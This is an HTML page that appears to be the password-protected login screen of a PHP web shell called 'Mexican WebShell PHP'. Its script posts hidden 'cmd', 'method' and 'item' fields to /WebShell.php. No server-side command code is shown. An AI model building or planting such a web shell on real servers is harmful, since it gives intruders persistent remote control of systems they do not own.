<html>
               <head>
                   <title>WebShell</title>
                   <link href='http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css' rel='stylesheet'>
                   <style type='text/css'>
                       body,html{ height:100%;} .footer{ padding-top:8px; padding-right:10px; text-align:right; height:30px; bottom:0; right:0; left:0; display:block; position:fixed;} .container{ min-height:100%; width:100%;}
                   </style>
                   <script src='http://code.jquery.com/jquery-1.9.1.min.js'></script>
                   <script src='http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/js/bootstrap.min.js'></script>
                   <script type='text/javascript'>
                                                function _asubmit(id){
                                                                var form = document.getElementById(id);
                                                                form.submit();
                                                }
 
                                                function elementsee(id, type){
 
                                                        if(type==1){
                                                                document.getElementById(id).style.display='none';
                                                        }else{
                                                                document.getElementById(id).style.display='block';
                                                        }
                                                }
 
                       function doFormPost(cmd,method,item){
 
                           var newForm=document.createElement('FORM');
                           document.body.appendChild(newForm);
                           newForm.method = 'POST';
 
                           var newElement = document.createElement('INPUT');
 
                           newForm.appendChild(newElement);
                           newElement.type='hidden';
                           newElement.name='cmd';
                           newElement.value = cmd;
 
                           var newElement = document.createElement('INPUT');
 
                           newForm.appendChild(newElement);
                           newElement.type='hidden';
                           newElement.name='method';
                           newElement.value = method;
 
                           var newElement = document.createElement('INPUT');
 
                           newForm.appendChild(newElement);
                           newElement.type='hidden';
                           newElement.name='item';
                           newElement.value = item;
 
                           newForm.action= '/WebShell.php';
                           newForm.submit();
                       }
                   </script>
               </head>
               <body>
                   <div class='container'>
       
 
                           <div style='background-color: #EEE; padding:10px; margin:0 auto; width:300px; margin-top: 10%;'>
                               <form class='well' method='POST'>
                                   <label>Mexican WebShell PHP</label>
                                   <input name='pass' type='password' class='span3' placeholder='Password' style='height:30px;'>
                                   <input type='hidden' name='cmd' value='login'>
                                   <button type='submit' class='btn'>Submit</button>
                               </form>
                           </div>
 
       
                   </div>
                   <div class='footer' style='color:#FFF; background-color:#2C2C2C'>Mexican WebShell PHP. Powered by <a href='https://twitter.com/#!/codersoul' target='_blank'>@codersoul</a></div>
               </body>
           </html>
       